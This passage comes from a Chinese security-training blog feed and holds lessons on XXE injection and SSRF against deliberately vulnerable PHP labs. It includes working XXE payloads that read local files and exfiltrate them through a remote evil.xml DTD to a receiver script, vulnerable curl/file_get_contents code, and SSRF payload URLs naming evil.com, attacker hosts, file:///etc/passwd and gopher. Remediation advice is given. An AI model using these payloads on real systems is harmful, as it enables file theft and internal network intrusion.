和端口开发情况，访问端口会获取 baner 信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631784028958-308bd616-603d-4392-904a-d5c9672d8be6.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631784046052-f21f9f2b-01a9-4c2f-9516-5efcfecd8f8a.png" alt="img"></p><h2 id="无回显"><a class="markdownIt-Anchor" href="#无回显">#</a> 无回显</h2><p>blind xxe （盲注）可以使用外带数据通道，提取数据 ；</p><p>环境：blindxxe.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string_xml = &#x27;&lt;?xml version=&quot;1.0&quot;</span><br><span class="line">encoding=&quot;GB18030&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;xml</span><br><span class="line">实体注入&lt;/body&gt;&lt;/note&gt;&#x27;;</span><br><span class="line">$xml = isset($_GET[&#x27;xml&#x27;])?$_GET[&#x27;xml&#x27;]:$string_xml;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">echo &#x27;&lt;meta charset=&quot;GB18030&quot;&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631784992303-c1277cfd-5c4f-4210-9b36-8261a70b3ef3.png" alt="img"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.50.237/evil.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">读取本地的C:/1.txt文件，发送给http://192.168.50.237/evil.xml</span><br><span class="line">evil.xml 文件内容：</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.50.237/1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">1.php内容：</span><br><span class="line"></span><br><span class="line">&lt;?php file_put_contents(&quot;1.txt&quot;, $_GET[&#x27;file&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>文件写入成功。获取 1.txt 内容；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631785963765-c36abb23-76d5-42d2-8fea-a7491483ac96.png" alt="img"></p><h1 id="xxe-防御方案"><a class="markdownIt-Anchor" href="#xxe-防御方案">#</a> xxe 防御方案</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.使用开发语言提供的禁用外部实体的方法:</span><br><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br><span class="line"></span><br><span class="line">2.过滤用户提交的 XML 数据:</span><br><span class="line">关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者，SYSTEM 和 PUBLIC</span><br><span class="line"></span><br><span class="line">3.升级 libxml 组件</span><br></pre></td></tr></table></figure><h1 id="xxe-lab-for-php"><a class="markdownIt-Anchor" href="#xxe-lab-for-php">#</a> XXE-Lab for PHP</h1><p>XXE-lab 是一个一个包含 php,java,python,C# 等各种语言版本的 XXE 漏洞靶场…</p><p>》》》靶场部署《《《</p><p>步骤一：将靶场进行下载…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/xxe-lab</span><br></pre></td></tr></table></figure><p>步骤二：将 PHPStudy 的中间件与版本信息调制为 <code>php-5.4.29+Apache</code>  访问以下地址开始练习…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.84/xxelabs/php_xxe/</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714272075-d5c881f8-1c99-475f-bcff-2956d059b29f.png" alt="img"></p><h3 id="一有回显的xxe"><a class="markdownIt-Anchor" href="#一有回显的xxe">#</a> 一：有回显的 XXE</h3><p>步骤一：在登录界面输入账号密码并抓取数据包…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714382184-ee7da977-178a-44f8-97b7-8b23b870e77b.png" alt="img"></p><p>步骤二：尝试读取本地文件…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">XL</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">fl</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d:/hacker.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;fl;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714439621-7ff2aa14-58ad-438d-ae63-3d735d8241d1.png" alt="img"></p><p>步骤三：使用 PHP 伪协议读取文件…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">XL</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">fl</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=d:/hacker.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;fl;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646715435359-4eff153e-84c0-408e-9604-d2c9cf1cf4c1.png" alt="img"></p><p>步骤四：探测内网存活主机与端口…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">XL</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">fl</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;fl;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646715508225-34428105-2a93-4349-abf0-7dbc94787b0a.png" alt="img"></p><h3 id="二无回显的xxe"><a class="markdownIt-Anchor" href="#二无回显的xxe">#</a> 二：无回显的 XXE</h3><p>思路：写两个外部参数实体，第一个用来请求本地数据内容，第二个用 http 协议或者其他协议把请求到的数据作为参数带到我们的 vps，这样就实现了数据外带了。我们将 <code>doLogin.php</code>  源码中的输出代码注释掉，将错误信息也不显示…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714604789-c723cbbd-6528-43a2-a4e6-f3c05c2ab7f7.png" alt="img"></p><p>步骤一：继续运行上面的 XML 语法，发现没有了数据回显…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714672885-fcf67bcf-94f4-4460-80ed-10d2ea2dd35c.png" alt="img"></p><p>步骤二：在远程服务器上创建 <code>evil.xml</code>  文件并使用 Python 开启 http 服务…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.84:8080/a.php?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714773438-55f05428-fcbb-48ff-88ee-46f790a7eccc.png" alt="img"></p><p>注意：之所以要把 “%” 转成 html 实体编码是因为在实体的值中不能有 “%”，所以也就只能转成 <code>&amp;#x25</code>  了</p><p>步骤三：构造外部实体… 并进行访问…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=d:/hacker.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.1.84:8080/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714866287-a06c7c6e-44ae-483f-b89a-8a977eff1bd0.png" alt="img"></p><p>步骤四：回到 HTTP 服务器上发现数据已经带到请求日志上… 经 Base64 解码得出内容…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646714954808-86821c13-2f49-4c40-bd7a-ba97d99c75d9.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646715001864-cd2382dc-39b2-4540-81a0-365a46c63d36.png" alt="img"></p><h3 id="三漏洞修复"><a class="markdownIt-Anchor" href="#三漏洞修复">#</a> 三：漏洞修复</h3><ol><li>使用开发语言禁用外部实体；</li><li>过滤 SYSTEM/PUBLIC 等关键字；</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第五天xxe实体注入&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第五天xxe实体注入&quot;&gt;#&lt;/a&gt; 第五天：XXE 实体注入&lt;/h1&gt;
&lt;h1 id=&quot;xxe-漏洞描述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/SSRF/"/>
    <id>https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/SSRF/</id>
    <published>2022-03-08T01:12:16.690Z</published>
    <updated>2022-03-08T01:55:19.944Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一知识回顾"><a class="markdownIt-Anchor" href="#一知识回顾">#</a> 一：知识回顾</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.什么是XSS？</span><br><span class="line"><span class="number">2</span>.XSS攻击方式都有哪些？</span><br><span class="line"><span class="number">3</span>.XSS三种攻击方式的区别？</span><br><span class="line"><span class="number">4</span>.XSS漏洞造成的危害？</span><br><span class="line"><span class="number">1</span>.什么是CSRF？</span><br><span class="line"><span class="number">2</span>.CSRF漏洞该怎样挖掘？</span><br></pre></td></tr></table></figure><p>》》》今日目标《《《</p><ol><li><p>掌握 SSRF 漏洞原理</p></li><li><p>掌握 SSRF 攻击方式</p></li><li><p>掌握 SSRF 挖掘姿势</p></li><li><p>熟悉 SSRF 防御手法</p></li></ol><h1 id="二ssrf漏洞"><a class="markdownIt-Anchor" href="#二ssrf漏洞">#</a> 二：SSRF 漏洞</h1><p>漏洞概述：</p><p>SSRF (Server-Side Request Forgery, 服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统 (正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统) ；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646443801811-991a35f1-3029-465e-abb0-ee56867c8fd8.png" alt="img"></p><h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理">#</a> 》》》漏洞原理《《《</h3><p>SSRF 形成的原因大都是由于服务端提供了 <code>从其他服务器应用获取数据的功能</code> ，且 <code>没有对目标地址做过滤与限制</code> 。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，文档，等等。</p><h3 id="高危函数"><a class="markdownIt-Anchor" href="#高危函数">#</a> 》》》高危函数《《《</h3><p>一. <code>curl_exec()</code> ：执行给定的 curl 会话… 这个函数应该在初始化一个 curl 会话并且全部的选向都被设置后调用…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line"><span class="comment">//file:///etc/passwd  读取文件</span></span><br><span class="line"><span class="comment">//http://192.168.1.15:22 根据banner返回,错误提示,时间延迟扫描端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br></pre></td></tr></table></figure><p>✪利用姿势：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.yuque.com/docs/share/36d86bd2-c5ce-413f-9c8a-a4a66946478d?#（密码：wbga） 《SSRF(curl)》</span></span><br></pre></td></tr></table></figure><p>☠注意问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_exec() <span class="comment">//默认不跟踪跳转</span></span><br><span class="line">curl/libcurl <span class="number">7.43</span> 上gopher协议存在bug(%<span class="number">00</span>截断) 经测试<span class="number">7.49</span> 可用</span><br></pre></td></tr></table></figure><p>二. <code>file_get_contents()</code> : 函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法…</p><p>例：以下代码执行的结果则是输出 test.txt 文件里的字符串…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>小实验：从用户指定的 URL 获取图片并保存在电脑上…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#保存成PUT.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">      &lt;title&gt;提交&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;form action=<span class="string">&quot;file_put_contents.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;提交一个url：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;url&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="comment">#保存成file_get_contents.php并与PUT.html一个文件夹</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;D:/images/&#x27;</span>.rand().<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">代码分析：</span><br><span class="line"><span class="keyword">isset</span>函数是判断有没有提交url;</span><br><span class="line">第四行<span class="variable">$content</span>变量将远程URL中的内容保存到content变量中;</span><br><span class="line">第五行随机生成一个文件路径;(.rand()随机生成一个字符串)</span><br><span class="line">第六行获取了远程的内容后将其写到新的文件中;</span><br><span class="line">第七行输出url;</span><br></pre></td></tr></table></figure><p>操作步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.在D盘下创建images文件夹，并给anonymouse全部权限...</span><br><span class="line"><span class="number">2</span>.PHPStudy下访问PUT.html文件并填入要下载图片的地址，点击提交....</span><br><span class="line"><span class="number">3</span>.进入D盘下的images文件夹中查看下载图片</span><br></pre></td></tr></table></figure><p>☢利用姿势：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.yuque.com/docs/share/06b28b2a-b034-4879-a35c-4434ac911cb8?#（密码：vgsr） 《SSRF(file_get_content)》</span></span><br></pre></td></tr></table></figure><p>☠注意问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents支持php:<span class="comment">//input协议</span></span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的<span class="number">302</span>跳转会出现bug，导致利用失败</span><br></pre></td></tr></table></figure><p>三. <code>fsockopen()</code> : 打开一个网络连接或套接字连接…</p><p>1. 使用 fsockopen 函数实现获取用户制定 url 的数据（文件或者 html）…</p><p>2. 这个函数会使用 socket 跟服务器建立 tcp 连接，传输原始数据…</p><p>3.fsockopen 本身就是打开一个网络连接或者 Unix 套接字连接…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击用到的协议：</p><table><thead><tr><th>协议</th><th>攻击姿势</th></tr></thead><tbody><tr><td>file</td><td>在有回显的情况下，利用 file 协议可以读取任意内容</td></tr><tr><td>dict</td><td>泄露安装软件版本信息，查看端口，操作内网 redis 服务等</td></tr><tr><td>gopher</td><td>gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell</td></tr><tr><td>http/s</td><td>探测内网主机存活</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br><span class="line">ssrf.php?url=ftp://evil.com:12345/TEST</span><br><span class="line"></span><br><span class="line">file://</span><br><span class="line">ssrf.php?url=file:///etc/password</span><br><span class="line"></span><br><span class="line">Dict://</span><br><span class="line">dict://<span class="tag">&lt;<span class="name">user-auth</span>&gt;</span>@<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/d:<span class="tag">&lt;<span class="name">word</span>&gt;</span></span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line"></span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line"></span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line"></span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line"></span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:3306</span><br></pre></td></tr></table></figure><h3 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式">#</a> 》》》攻击方式《《《</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">无视CDN</span><br><span class="line">进行跳板</span><br><span class="line">利用 file 协议读取本地文件等...</span><br><span class="line">攻击运行在内网或本地的应用程序...</span><br><span class="line">利用Redis未授权访问，HTTP 